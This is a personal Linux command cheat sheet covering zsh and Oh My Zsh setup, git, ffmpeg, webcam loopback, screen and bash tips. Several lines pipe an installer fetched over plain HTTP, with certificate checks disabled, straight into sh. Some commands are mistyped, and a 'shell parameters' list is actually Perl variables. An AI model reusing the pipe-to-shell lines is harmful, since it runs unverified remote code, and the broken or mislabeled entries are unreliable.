$> sudo apt-get install git-core zsh
##-----------------------------------------
## Autosugestions in terminal using zsh
$> https://www.dev-diaries.com/blog/terminal-history-auto-suggestions-as-you-type/
## Install zsh
$> sudo apt-get install git-core zsh
## Get zsh auto suggest deb
$> wget https://download.opensuse.org/repositories/shells:/zsh-users:/zsh-autosuggestions/xUbuntu_18.04/amd64/zsh-autosuggestions_0.5.0+1.1_amd64.deb
$> ## Install it
##--------------------
## Install Oh My zsh
$> wget --no-check-certificate http://install.ohmyz.sh -O - | sh
## Add autosuggestion
$> git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
## Add to ~/.zshrc
#@ plugins=(git zsh-autosuggestions)
#@ source $ZSH/oh-my-zsh.sh
##--------------------
## OR
## Manual (Git Clone)
## Make a zsh config directory
$> mkdir ~./.zsh
## Clone this repository somewhere on your machine. This guide will assume ~/.zsh/zsh-autosuggestions.
$> git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions
## Add to your .zshrc:
$> echo "source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh" >> ~/.zshrc
##------------------------------------------
## Install Oh My zsh
$> wget --no-check-certificate http://install.ohmyz.sh -O - | sh.zshrc
## Add autosuggestion
$> git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
## Add to ~/.zshrc
$> plugins=(git zsh-autosuggestions)
$> source $ZSH/oh-my-zsh.sh
##--------------------
## Get zsh auto suggest deb
$> wget https://download.opensuse.org/repositories/shells:/zsh-users:/zsh-autosuggestions/xUbuntu_18.04/amd64/zsh-autosuggestions_0.5.0+1.1_amd64.deb
## Install it
##--------------------
## Check current shell
$> echo $0
## Check available shells
$> cat /etc/shells
## Choose default shell, must sign back
##--------------------
## Install Oh My zsh
$> wget --no-check-certificate http://install.ohmyz.sh -O - | sh
## Add autosuggestion
$> git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
## Add to ~/.zshrc
#@ plugins=(git zsh-autosuggestions)
#@ source $ZSH/oh-my-zsh.sh
##--------------------in to get new shell
## Make zsh default shell: need password
$> chsh -s $(which zsh)
$> chsh -s /bin/zsh
$> chsh -s /usr/bin/zsh
## Make bash default shell:
$> chsh -s $(which bash)
##------------------------------------------
## Add ohmy to .*rc
$> cat ~/.zshrc.ohmy > ~/.zshrc
$> cat ~/.zshrc.zsh > ~/.zshrc
##------------------------------------------
### Prompt
$> firefox http://zsh.sourceforge.net/Doc/Release/Prompt-Expansion.html
##-----------------------------------------
## syntax-highlighting
## Simply clone this repository and source the script:
$> cd ~/.zsh
$> git clone https://github.com/zsh-users/zsh-syntax-highlighting.git
$> echo "source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" >> ${ZDOTDIR:-$HOME}/.zshrc
## or
$> echo "source ~/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" >> ~/.zshrc
## Then, enable syntax highlighting in the current interactive shell:
$> source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh=
##==========================================
## Remove git tags
git tag -d $(git for-each-ref --format='%(refname:short)' 'refs/tags/phabricator')
## Or nuke all tags then re-pull.
git tag -l | xargs git tag -d; git pull --tags
##==========================================
## gui mouse. Change functions of mouse buttons
$> firefox http://xahlee.info/linux/linux_swap_mouse_buttons.html
## get mouse name
$> xinput --list
## set the side buttons of "mouse name" to be same as the left click, and scroll push
$> xinput --set-button-map "M585 Mouse" 1 2 3 4 5 6 7 2 1
## put back to normal
$> xinput --set-button-map "M585 Mouse" 1 2 3 4 5 6 7 8 9
## disable side buttons
$> xinput --set-button-map "M585 Mouse" 1 2 3 4 5 6 7 0 0
##==========================================
## In order to get absolute directory name with ls, enter in the terminal command shell:
$> ls -d $PWD/*
##==========================================
## Instead of overwriting the “clear” command, its probably a better idea to have a new one. “cls” is a good choice and the same as on Windows.
$> alias cls="printf \"\e[H\e[2J\e[3J\""
## You can also bind it to C-l.
$> bind -x '"\C-l": cls';
## As the clear command does clear everything in my case, I have this on my .bashrc to have Control-L do exactly the same:
$> bind -x '"\C-l"':clear
##==========================================
## power. Ways to shutdown a server
$> systemctl kexec/reboot
$> sudo shutdown -r now
$> sudo poweroff
$> reboot -p
$> halt
$> hold down Alt + Print Screen, then the R E I S U B keys in that order
$> sudo init 0
$> sudo journalctl -u systemd-shutdownd
##==========================================
## install. Check the dependencies of packages in the repository:
$> apt-cache depends package-name
## Shows package origin and versions available
$> apt-cache policy <searchterm>
## display the complete details of the package version along with all dependencies.
$> apt-cache showpkg chromium-browser
## displays the package version from Ubuntu repositories.
$> apt-cache madison chromium-browser
## Downgrade chromium
$> sudo apt-get install chromium-codecs-ffmpeg=65.0.3325.181-0ubuntu1  chromium-codecs-ffmpeg=65.0.3325.181-0ubuntu1  chromium-browser=65.0.3325.181-0ubuntu1 -V
##==========================================
## Prompt
## https://wiki.archlinux.org/index.php/Bash/Prompt_customization
$>  txtblk='\e[0;30m' ## Black - Regular
$>  txtred='\e[0;31m' ## Red
$>  txtgrn='\e[0;32m' ## Green
$>  txtylw='\e[0;33m' ## Yellow
$>  txtblu='\e[0;34m' ## Blue
$>  txtpur='\e[0;35m' ## Purple
$>  txtcyn='\e[0;36m' ## Cyan
$>  txtwht='\e[0;37m' ## White
$>  bldblk='\e[1;30m' ## Black - Bold
$>  bldred='\e[1;31m' ## Red
$>  bldgrn='\e[1;32m' ## Green
$>  bldylw='\e[1;33m' ## Yellow
$>  bldblu='\e[1;34m' ## Blue
$>  bldpur='\e[1;35m' ## Purple
$>  bldcyn='\e[1;36m' ## Cyan
$>  bldwht='\e[1;37m' ## White
$>  unkblk='\e[4;30m' ## Black - Underline
$>  undred='\e[4;31m' ## Red
$>  undgrn='\e[4;32m' ## Green
$>  undylw='\e[4;33m' ## Yellow
$>  undblu='\e[4;34m' ## Blue
$>  undpur='\e[4;35m' ## Purple
$>  undcyn='\e[4;36m' ## Cyan
$>  undwht='\e[4;37m' ## White
$>  bakblk='\e[40m'   ## Black - Background
$>  bakred='\e[41m'   ## Red
$>  bakgrn='\e[42m'   ## Green
$>  bakylw='\e[43m'   ## Yellow
$>  bakblu='\e[44m'   ## Blue
$>  bakpur='\e[45m'   ## Purple
$>  bakcyn='\e[46m'   ## Cyan
$>  bakwht='\e[47m'   ## White
$>  txtrst='\e[0m'    ## Text Reset
## Available control commands for PS1 string:
$>  d     ## the date in "Weekday Month Date" format (e.g., "Tue May 26")
$>  e     ## an ASCII escape character (033)
$>  h     ## the hostname up to the first .
$>  H     ## the full hostname
$>  j     ## the number of jobs currently run in background
$>  l     ## the basename of the shells terminal device name
$>  n     ## newline
$>  r     ## carriage return
$>  s     ## the name of the shell, the basename of $0 (the portion following the final slash)
$>  t     ## the current time in 24-hour HH:MM:SS format
$>  T     ## the current time in 12-hour HH:MM:SS format
$>  @     ## the current time in 12-hour am/pm format
$>  A     ## the current time in 24-hour HH:MM format
$>  u     ## the username of the current user
$>  v     ## the version of bash (e.g., 4.00)
$>  V     ## the release of bash, version + patch level (e.g., 4.00.0)
$>  w     ## Complete path of current working directory
$>  W     ## the basename of the current working directory
$>  !     ## the history number of this command
$>  #     ## the command number of this command
$>  $     ## if the effective UID is 0, a #, otherwise a $
$>  nnn   ## the character corresponding to the octal number nnn
$>  \     ## a backslash
$>  [     ## begin a sequence of non-printing characters, which could be used to embed a terminal control sequence into the prompt
$>  ]     ## end a sequence of non-printing characters
##==========================================
## ###########################################################
## ##    Git
## ###########################################################
## correct an unpushed commit message
$> git commit --amend -m "New message"
##==========================================
$> echo ${USER}
## set your Git username
$> git config --global user.name "YOUR NAME HERE"
## Check your Git username
$> git config --global user.name
## Set your Git email.
$> git config --global user.email "youremail@gmail.com"
## Set remote repo on hithub
$> git remote add origin https://github.com/YOURGITHUBACCOUNTHERE
##
## ###########################################################
## Bluetooth pair your phone to your computer, play audio from your phone on computer speakers
## If you add the pulseaudio-bluetooth package
$> sudo apt-get install pulseaudio-bluetooth
## add the following two lines to /etc/pulse/system.pa and
$> sudo echo "load-module module-bluetooth-policy
load-module module-bluetooth-discover" >> /etc/pulse/system.pa
##==========================================
### Redirects
##           || visible in terminal ||   visible in file   || existing
##   Syntax  ||  StdOut  |  StdErr  ||  StdOut  |  StdErr  ||   file
#==========++==========+==========++==========+==========++===========
$>     >     ||    no    |   yes    ||   yes    |    no    || overwrite
$>     >>    ||    no    |   yes    ||   yes    |    no    ||  append
$>           ||          |          ||          |          ||
$>    2>     ||   yes    |    no    ||    no    |   yes    || overwrite
$>    2>>    ||   yes    |    no    ||    no    |   yes    ||  append
$>           ||          |          ||          |          ||
$>    &>     ||    no    |    no    ||   yes    |   yes    || overwrite
$>    &>>    ||    no    |    no    ||   yes    |   yes    ||  append
$>           ||          |          ||          |          ||
$>  | tee    ||   yes    |   yes    ||   yes    |    no    || overwrite
$>  | tee -a ||   yes    |   yes    ||   yes    |    no    ||  append
$>           ||          |          ||          |          ||
$>  n.e. (*) ||   yes    |   yes    ||    no    |   yes    || overwrite
$>  n.e. (*) ||   yes    |   yes    ||    no    |   yes    ||  append
$>           ||          |          ||          |          ||
$> |& tee    ||   yes    |   yes    ||   yes    |   yes    || overwrite
$> |& tee -a ||   yes    |   yes    ||   yes    |   yes    ||  append
##==========================================
## Continuous gpu usage info, refresh interval of 1 second
$> nvidia-smi -l 1
##==========================================
## similar to top and htop, but specifically for the Intel GPU
## from http://intellinuxgraphics.org/ project
$> sudo apt-get install intel-gpu-tools
$> sudo intel_gpu_top
##==========================================
😎 😘 😂 😆 😈 😱 😭 😅 😗 😜 💰😏 😡 ✌ ☝ ✍ ☔ ⚡ ☕ ♿ ⌛ ⌚
⚫ ⚓ 🐰 🕳 ⬢ 🌳 💧 🐦 🛠 🐹 🐘 𝗥 ஃ 🐳 ☁️ 🅒 🐍 ☸️ 🛠 📦 ❤️
⚪ ⚫ 💰 🚺 🍤 🦐 🐠 🦀 🐙 🐡 🔊
♈ ♉ ♊ ♋ ♌ ♍ ♎ ♏ ♐ ♑ ♒ ♓
1  😞 ￼😐 ￼😃
##==========================================
## tabnine. Not great
$> firefox https://www.tabnine.com/install/sublime/
## Type TabNine::config in your editor to control TabNine settings.
## Vim
#    Add Plugin 'zxqfl/tabnine-vim' to your .vimrc.
#    Type :PluginInstall and press Enter.
## Without Vundle
## Run
$> git clone --depth 1 https://github.com/zxqfl/tabnine-vim in your terminal.
## Add
$> set rtp+=~/tabnine-vim to your .vimrc (replacing ~/tabnine-vim with the path you cloned it to).
##==========================================
## Quick ref for
$> for i in {01..10}; do <BLA>$i <COMMAND>; done
##==========================================
##
## install gimp-webp on your Debian-based Linux machine.
$ sudo apt-add-repository ppa:george-edison55/webp
$ sudo apt-get update
$ apt-get install gimp-webp
##==========================================
## check the dependencies of packages in the repository:
$> apt-cache depends package-name
##==========================================
## git prompt, not as good
$> firefox https://raw.githubusercontent.com/git/git/master/contrib/completion/git-prompt.sh
##==========================================
## Set the nvidia fan speed:
$> firefox https://devtalk.nvidia.com/default/topic/789888/set-fan-speed-without-an-x-server-solved-/ 2
## It works, one can set the fan speed as desired, and then kill the X server again.
## Recommended to run this one first:
$> nvidia-xconfig --enable-all-gpus --separate-x-screens --allow-empty-initial-configuration
## All in one script:
#X :0 &
#sleep 5
#nvidia-settings -a “[gpu:0]/GPUFanControlState=1”
#nvidia-settings -a “[gpu:1]/GPUFanControlState=1”
#nvidia-settings -a “[gpu:2]/GPUFanControlState=1”
#nvidia-settings -a “[gpu:3]/GPUFanControlState=1”
#nvidia-settings -a “[fan:0]/GPUTargetFanSpeed=100”
#nvidia-settings -a “[fan:1]/GPUTargetFanSpeed=100”
#nvidia-settings -a “[fan:2]/GPUTargetFanSpeed=100”
#nvidia-settings -a “[fan:3]/GPUTargetFanSpeed=100”
#killall Xorg
##==========================================
## git branch
#parse_git_branch() {
#     git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ (\1)/'
#}
#setopt PROMPT_SUBST ; PS1='%F{green}%B%m:%F{blue}%~%f%b$(parse_git_branch)⚡'
##==========================================
## tell me when the servers are back up after reboot/reinstall, not working
$> notify-send 'Subject.' 'This is my message.'
$> at now + 0.5 min < ping -c1 192.168.1.154 && notify-send 'Subject.' 'This is my message.'
##==========================================
## shell default parameters
$>  $          ## The PID of the current process.
$>  ?          ## The return code of the last executed command.
$>  *          ## The list of arguments passed to the current process
$>  #          ## The number of arguments in $*
$>  _          ## The default parameter for a lot of functions.
$>  .          ## Holds the current record or line number of the file handle that was last read. It is read-only and will be reset to 0 when the file handle is closed.
$>  /          ## Holds the input record separator. The record separator is usually the newline character. However, if $/ is set to an empty string, two or more newlines in the input file will be treated as one.
$>  ,          ## The output separator for the print() function. Nor-mally, this variable is an empty string. However, setting $, to a newline might be useful if you need to print each element in the parameter list on a separate line.
$>  \          ## Added as an invisible last element to the parameters passed to the print() function. Normally, an empty string, but if you want to add a newline or some other suffix to everything that is printed, you can assign the suffix to $.
$>  #          ## The default format for printed numbers. Normally, its set to %.20g, but you can use the format specifiers covered in the section "Example: Printing Revisited" in Chapter 9to specify your own default format.
$>  %          ## Holds the current page number for the default file handle. If you use select() to change the default file handle, $% will change to reflect the page number of the newly selected file handle.
$>  =          ## Holds the current page length for the default file handle. Changing the default file handle will change $= to reflect the page length of the new file handle.
$>  -          ## Holds the number of lines left to print for the default file handle. Changing the default file handle will change $- to reflect the number of lines left to print for the new file handle.
$>  ~          ## Holds the name of the default line format for the default file handle. Normally, it is equal to the file handles name.
$>  ^          ## Holds the name of the default heading format for the default file handle. Normally, it is equal to the file handles name with _TOP appended to it.
$>  |--        ## If nonzero, will flush the output buffer after every write() or print() function. Normally, it is set to 0.
$>  $--        ## This UNIX-based variable holds the process number of the process running the Perl interpreter.
$>  ?--        ## Holds the status of the last pipe close, back-quote string, or system() function.
$>  &--        ## Holds the string that was matched by the last successful pattern match.
$>  `-         ## Holds the string that preceded whatever was matched by the last successful pattern match.
$>  '--      ' ## Holds the string that followed whatever was matched by the last successful pattern match.
$>  +--        ## Holds the string matched by the last bracket in the last successful pattern match. For example, the statement /Fieldname: (.*)|Fldname: (.*)/ && ($fName = $+); will find the name of a field even if you dont know which of the two possible spellings will be used.
$>  *--        ## Changes the interpretation of the ^ and $ pattern anchors. Setting $* to 1 is the same as using the /m option with the regular expression matching and substitution operators. Normally, $* is equal to 0.
$>  0--        ## Holds the name of the file containing the Perl script being executed.
$>  <number>-- ## This group of variables ($1, $2, $3, and so on) holds the regular expression pattern memory. Each set of parentheses in a pattern stores the string that match the components surrounded by the parentheses into one of the $<number> variables.
$>  [--        ## Holds the base array index. Normally, its set to 0. Most Perl authors recommend against changing it without a very good reason.
$>  ]--        ## Holds a string that identifies which version of Perl you are using. When used in a numeric context, it will be equal to the version number plus the patch level divided by 1000.
$>  "--      " ## This is the separator used between list elements when an array variable is interpolated into a double-quoted string. Normally, its value is a space character.
$>  ;--        ## Holds the subscript separator for multidimensional array emulation. Its use is beyond the scope of this book.
$>  !--        ## When used in a numeric context, holds the current value of errno. If used in a string context, will hold the error string associated with errno.
$>  @--        ## Holds the syntax error message, if any, from the last eval() function call.
$>  <-         ## This UNIX-based variable holds the read uid of the current process.
$>  >--        ## This UNIX-based variable holds the effective uid of the current process.
$>  )--        ## This UNIX-based variable holds the read gid of the current process. If the process belongs to multiple groups, then $) will hold a string consisting of the group names separated by spaces.
$>  :--        ## Holds a string that consists of the characters that can be used to end a word when word-wrapping is performed by the ^ report formatting character. Normally, the string consists of the space, newline, and dash characters.
$>  ^D--       ## Holds the current value of the debugging flags. For more information.
$>  ^F--       ## Holds the value of the maximum system file description. Normally, its set to 2. The use of this variable is beyond the scope of this book.
$>  ^I--       ## Holds the file extension used to create a backup file for the in-place editing specified by the -i command line option. For example, it could be equal to ".bak."
$>  ^L--       ## Holds the string used to eject a page for report printing.
$>  ^P-        ## This variable is an internal flag that the debugger clears so it will not debug itself.
$>  ^T--       ## Holds the time, in seconds, at which the script begins running.
$>  ^W--       ## Holds the current value of the -w command line option.
$>  ^X--       ## Holds the full pathname of the Perl interpreter being used to run the current script.
## redirect
$>  2<&-       ## closes stderr,
$>  >&-        ## closes stdout
##==========================================
## Accessing an iPads file system from Linux
## Despite using Linux on pretty much every computer I’ve owned for the last 20 years I’ve made an exception when it comes to tablet devices and adopted an iPad into my life as commute friendly “source of all books.” Overtime it’s been occasionally pressed into service as a camera and I recently realised I’ve never backed any of those photos up. “That’s something easy to remedy” I naively thought as I plugged my iPad into a laptop and watched as it didn’t appear as a block device.
## While there are many pages on the internet that explain parts of the process of accessing your iPad file system from Linux it was awkward enough to piece together that I decided to summarise my own commands in this post for future me. I used the following commands on a Fedora 28 install to access an iPad Air 2.
## First add the software needed to make the connection work:
## install the required packages (on fedora)
$> sudo apt-get install ifuse libimobiledevice-utils
## Once this is installed unlock the iPad and run idevicepair pair to pair the iPad with your Linux host. You should see a message saying that pairing was successful. Now we have access to the device let’s access its file system. Create the mount point and make the current user the owner:
$> sudo install -d /mnt/ipad -o $USER
## Finally, mount the iPad so we can access its file system:
$> ifuse /mnt/ipad
$> ls -alh /mnt/ipad/
## If this fails ensure the ifuse module is loaded by running lsmod, and run modprobe ifuse if it isn’t. Once you’ve finished exploring don’t forget to release the iPad.
$> umount /mnt/ipad
##==========================================
## video. Transcoding
$> ffmpeg -i input.mkv -c:a libvorbis -c:v libvpx -b:a 80k -b:v 500k output.webm
## average bitrate is _exactly_ 2x more than specified same but with halving framerate
$> ffmpeg -i input.mkv -c:a libvorbis -c:v libvpx -b:a 80k -b:v 500k -r 30 output.webm
## average bitrate is 250k higher
## halving framerate first then transcoding
$> ffmpeg -i input.mkv -r 30 30fps_output.mkv
## audio gets transcoded for some reason
$> ffmpeg -i input.mkv -r 30 -c:a copy 30fps_output.mkv
## filesize is 1,5x the original size but whatever, it worked
$> ffmpeg -i 30fps_output.mkv -c:a libvorbis -c:v libvpx -b:a 80k -b:v 500k output.webm
## average bitrate is 250k higher
$> -i your_input -c:v encoderlib -b:v bitrate -vf "filter options" "output"
## set bitrate, minrate and maxrate (in bits)
$> ffmpeg -i my_video.mkv -vcodec x264 -minrate 1400000 -b:v 1500000 -maxrate 1600000 my_output.mkv
## 1400000 = 1.4M
$> ffmpeg -i input.mkv -filter:v "fps=fps=30" -c:v libvpx -b:v 500k -c:a libvorbis -b:a 80k output.webm
## it brings the output rate down to about 650k or so according to mpv. I think the -r option just sets the framerate on the container file but doesnt actually drop frames to get it. I may be wrong on that though.
##==========================================
## download music from youtube
$> youtube-dl --extract-audio --audio-format mp3 --batch-file list.txt
##==========================================
## learn.
##    1) learn what is Dockerfile
##    2) add some apps on top of base image with dockerfile
##    3) learn to mount volumes when docker run
##    4) learn to bind ports when docker run
##    5) learn to tag image
##    6) learn to attach shell to running container
##    7) learn to stop container
##    8) learn to delete image
##    9) learn to delete volume
##    10) learn to delete container
##    11) manually add nginx to ubuntu image
##    12) add index.html and ngonx.conf to image in 11) using dockerfile
##    13) when running 11) attach it to a specific network
##    14) leave the container running
##    15) create a new container ubuntu+telnet
##    16) start it in a different network
##    17) try curl to 11)
##    18) stop the container 15)
##    19) run container in same network as 11)
##    20) try curl to 11)
##    21) understand what happened
##    22) recreate the two apps with docker compose and figure out what you need to define
##==========================================
## ##########################################
## ##   Screen HOWTO
## ##########################################
## start a screens session
$> screen -S YOURSESSIONNAME
## reattach to screen session
$> screen -ls
$>screen -r YOURSESSIONNAME
## You can quit that screen without attaching to it. First, find its session:
$> screen -ls
## "detach" your screen session but leave your processes running.
$> Ctrl - A
$> Ctrl - D
## You can now log out of the remote box. If you want to come back later, log on again and type  This will "resume" your screen session, and you can see the output of your process.
$> screen -r
## This will "resume" your screen session, and you can see the output of your process.
## and then quit it:(-X = Execute command, -S session PID to execute on)
$> screen -XS YOURSESSIONNAME quit
## ##########################################
## ##########################################
##==========================================
## Shell script
## An if statement in bash just runs some program and checks if the return code was zero. The '!' operator will negate the return code. So when you type something like this
$# if ! some_program; then
$#     some_operation;
$# fi
## Bash will execute "some_program" and get its return code, it will then negate it and conditionally execute the program. So in this example, if "some_program" returned 1, the ! would turn it to a 0 and the if condition would be true.
## When you use the brackets what youre actually doing is calling a program called "test" that does a conditional comparison and returns 0 if it's true and 1 if it's false.
$# if test "1" -eq "1"; then
$#     some_operation;
$# fi
## or
$# if [ "1" -eq "1" ]; then
$#     some_operation;
$# fi
## These do the same thing. The double brackets [[..]] are a Bash extension that is built into the language itself. Its less portable but often easier.
## Yes, you could also do this
$#    if [ ! -f "file.txt" ]; then
$#       some_operation;
$#    fi
## or even this if you really want to.
$> [ ! -f "file.txt" ] && some_operation;
##  create a file only if it doesnt already exist.
$#    if ! test -f "/file" ;
$#    then
$#      sudo touch "/file"
$#    fi
##==========================================
## Make timestamped output file
$> outputfile="output_$(date --utc +"%y_%m_%d_%H%M%S").mp4"
##==========================================
## text. ripgrep - line-oriented search tool that recursively searches your current directory for a regex pattern.
$> curl -LO https://github.com/BurntSushi/ripgrep/releases/download/12.1.1/ripgrep_12.1.1_amd64.deb
$> sudo dpkg -i ripgrep_12.1.1_amd64.deb
##==========================================
## video. Script that records an endless GIF from webcam and then broadcasts it to a loopback camera.
$> sudo apt-get install v4l2loopback-utils
## creates fake camera input
$> sudo modprobe v4l2loopback
## all your video devices can be listed with
$> v4l2-ctl --list-device
## Make a gif out of a video
$> ffmpeg -hide_banner -loglevel panic -i video.webm -vf "fps=50,scale=320:-1:flags=lanczos,split[s0][s1];[s0]palettegen[p];[s1][p]paletteuse" -loop 0 video.gif
## sends looped gif into it
$> ffmpeg -re -stream_loop -1 -i video.gif -f v4l2 -vcodec rawvideo -pix_fmt yuv420p  /dev/video2
## In zoom settings>Video pick correct
##------------------------------------------
## Script
## You need those packages: (names are for void, on other disros they may differ)
$> sudo apt-get install v4l2loopback-utils
$> sudo apt-get install v4l-utils
$> sudo apt-get install gstreamer1
$> sudo apt-get install gst-plugins-base1
$> sudo apt-get install gst-plugins-good1
## Preparation
## First, you need to create two loopback cameras. To do so, execute as root:
$> modprobe v4l2loopback devices=2 card_label="Real","Fake"
## Here I create cameras "Real" for primary usage and "Fake" for gif broadcast. The reason we have "Real" is that on linux you can't access one camera from two programs, but you can access one loopback device from two programs.
## all your video devices can be listed with
$> v4l2-ctl --list-device
## Now execute following command to make "Real" work (note that this command should work in background):
$> gst-launch-1.0 v4l2src device=/dev/video0 ! tee name=t ! queue ! v4l2sink device=/dev/video2
## Can make script
$> cat > fake_cam.sh << EOF
#/bin/sh
## Usage
## ./fake_cam.sh <dur>, where <dur> is the
##                      duration of a gif.
##                      Can be omitted.
## Parameters
SOURCE="/dev/video3"
TARGET="/dev/video4"
# Get time parameter
DURATION=5
[ $# -gt 0 ] && DURATION=$1
## Generate name
IMG=$(mktemp -u)
# Record from webcam
echo "Recording $DURATION seconds"
gst-launch-1.0 -v v4l2src device=$SOURCE ! jpegenc ! avimux ! filesink location=$IMG.avi >/dev/null &
PID=$!
sleep $DURATION
kill -9 $PID
## Create endless gif
echo "Generating GIF"
$> ffmpeg -hide_banner -loglevel panic -i $IMG.avi -vf "fps=50,scale=320:-1:flags=lanczos,split[s0][s1];[s0]palettegen[p];[s1][p]paletteuse" -loop 0 $IMG.gif
## Broadcast gif to the webcam
echo "Broadcasting"
ffmpeg -hide_banner -loglevel panic -re -stream_loop -1 -i $IMG.gif -f v4l2 -vcodec rawvideo -pix_fmt yuv420p $TARGET
EOF
## Make executable
$> chmod +x ./fake_cam.sh
$> ./fake_cam.sh 5
##==========================================
## web. Search with parameters
$> intitle:"index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) -inurl:(hypem|unknownsecret|sirens|writeups|trimediacentral|articlescentral|listen77|mp3raid|mp3toss|mp3drug|theindexof|index_of|wallywashis|indexofmp3)
##==========================================
## video. Use OBS to stream to video
$> firefox https://obsproject.com/wiki/install-instructions#linux
$> firefox https://www.youtube.com/watch?v=Eca509IDLdM
$> sudo add-apt-repository ppa:obsproject/obs-studio
$> sudo apt-get update
$> sudo apt-get install obs-studio
$> firefox https://github.com/CatxFish/obs-v4l2sink/releases
## Make new video device, TAB for list
$> ls /dev/vid <TAB>
## OR
$> ls /dev/ | grep video
## Start fake video device
$> sudo modprobe v4l2loopback
## Check it for the new one created
$> ls /dev/ | grep video
## in obs choose the new v4l2 device
## in obs go to tools pick
$> v4l2sink
##==========================================
## files. Data recovery
$> firefox https://behind.pretix.eu/2020/11/28/undelete-flv-file/
##==========================================
## multimedia. web. Download vids from private channel
## Go to youtube page to be dl
## create cookiesfile.txt
$> firefox https://chrome.google.com/webstore/detail/get-cookiestxt/bgaddhkoddajcdgocldbbfleckgcbcid/related?hl=en
## Download
$> yt-dlp --cookies youtube.com_cookies.txt https://youtu.be/abcdefgh
##==========================================
## multimedia. Collect audio from youtube
$> youtube-dl -x --audio-format mp3 --prefer-ffmpeg --batch-file <list to download>
##==========================================
## learn. Tips and tricks from web
<<Comment5
I have marked with a * those which I think are absolutely essential
Items for each section are sorted by oldest to newest. Come back soon for more!

BASH
* In bash, 'ctrl-r' searches your command history as you type
- Input from the commandline as if it were a file by replacing
  'command < file.in' with 'command <<< "some input text"'
- '^' is a sed-like operator to replace chars from last command
  'ls docs; ^docs^web^' is equal to 'ls web'. The second argument can be empty.
* '!!' expands to the last typed command. Useful for root commands:
  'cat /etc/...' [permission denied] 'sudo !!'
* '!!:n' selects the nth argument of the last command, and '!$' the last arg
  'ls file1 file2 file3; cat !!:1-2' shows all files and cats only 1 and 2
- 'ESC-.' fetches the last parameter of the previous command
* Related, include 'shopt -s histverify histreedit' on your .bashrc to
  double-check all expansions before submitting a command
- 'nohup ./long_script &' to leave stuff in background even if you logout
- 'cd -' change to the previous directory you were working on
- 'ctrl-x ctrl-e' opens an editor to work with long or complex command lines
* Use traps for cleaning up bash scripts on exit
  http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_12_02.html
* 'shopt -s cdspell' automatically fixes your 'cd folder' spelling mistakes
* Add 'set editing-mode vi' in your ~/.inputrc to use the vi keybindings
  for bash and all readline-enabled applications (python, mysql, etc)
- Aggregate history of all terminals in the same .history. On your .bashrc:
      shopt -s histappend
      export HISTSIZE=100000
      export HISTFILESIZE=100000
      export HISTCONTROL=ignoredups:erasedups
      export PROMPT_COMMAND="history -a;history -c;history -r;$PROMPT_COMMAND"
- Pressed 'Ctrl-s' by accident and the terminal is frozen? Unfreeze: 'Ctrl-Q'

PSEUDO ALIASES FOR COMMONLY USED LONG COMMANDS
- function lt() { ls -ltrsa "$@" | tail; }
- function psgrep() { ps axuf | grep -v grep | grep "$@" -i --color=auto; }
- function fname() { find . -iname "*$@*"; }
- function remove_lines_from() { grep -F -x -v -f $2 $1; }
  removes lines from $1 if they appear in $2
- alias pp="ps axuf | pager"
- alias sum="xargs | tr ' ' '+' | bc" ## Usage: echo 1 2 3 | sum
- function mcd() { mkdir $1 && cd $1; }

VIM
- ':set spell' activates vim spellchecker. Use ']s' and '[s' to move between
  mistakes, 'zg' adds to the dictionary, 'z=' suggests correctly spelled words
- check my .vimrc https://github.com/cfenollosa/dotfiles/blob/master/.vimrc

TOOLS
* 'htop' instead of 'top'
- 'ranger' is a nice console file manager for vi fans
- Use 'apt-file' to see which package provides that file you're missing
- 'dict' is a commandline dictionary
- Learn to use 'find' and 'locate' to look for files
- Compile your own version of 'screen' from the git sources. Most versions
  have a slow scrolling on a vertical split or even no vertical split at all.
  Alternatively, use 'tmux', though it is not as ubiquitous as 'screen'.
* 'trash-cli' sends files to the trash instead of deleting them forever.
  Be very careful with 'rm' or maybe make a wrapper to avoid deleting '*' by
  accident (e.g. you want to type 'rm tmp*' but type 'rm tmp *')
- 'file' gives information about a file, as image dimensions or text encoding
- 'sort -u' to check for duplicate lines
- 'echo start_backup.sh | at midnight' starts a command at the specified time
- Pipe any command over 'column -t' to nicely align the columns
* Google 'magic sysrq' to bring a Linux machine back from the dead
- 'diff --side-by-side fileA.txt fileB.txt | pager' to see a nice diff
* 'j.py' https://github.com/rupa/j2 remembers your most used folders and is an
  incredible substitute to browse directories by name instead of 'cd'
- 'dropbox_uploader.sh' lets you upload by commandline via Dropbox's API
  without the official client https://github.com/andreafabrizi/Dropbox-Uploader
- learn to use 'pushd' to save time navigating folders (j.py is better though)
- if you liked the 'psgrep' alias, check 'pgrep' as it is far more powerful
* never run 'chmod o+x * -R', capitalize the X to avoid executable files. If
  you want _only_ executable folders: 'find . -type d -exec chmod g+x {} \;'
- 'xargs' gets its input from a pipe and runs some command for each argument
* run jobs in parallel easily: 'ls *.png | parallel -j4 convert {} {.}.jpg'
- grep has a '-c' switch that counts occurences. Don't pipe grep to 'wc -l'.
- 'man hier' explains the filesystem folders for new users
- 'tree' instead of 'ls -R'
* Recover corrupt zip files: First, make copies and **ALWAYS WORK ON A COPY**
    First: 'zip -F  corrupt_copy1.zip --out recover1.zip'
    Then:  'zip -FF corrupt_copy2.zip --out recover2.zip'
    Last:  'ditto -x -k corrupt_copy3.zip --out out_folder/'
  Merge the contents of the two recovered zipfiles and the out_folder. You
  will be able to recover most of the data.
* Use GNU datamash for basic numerical, textual and statistical operations
  on text files: 'seq 10 | datamash sum 1 mean 1'


NETWORKING
- Don't know where to start? SMB is usually better than NFS for newbies.
  If really you know what you are doing, then NFS is the way to go.
* If you use 'sshfs_mount' and suffer from disconnects, use
  '-o reconnect,workaround=truncate:rename'
- 'python -m SimpleHTTPServer 8080' or 'python3 -mhttp.server localhost 8080'
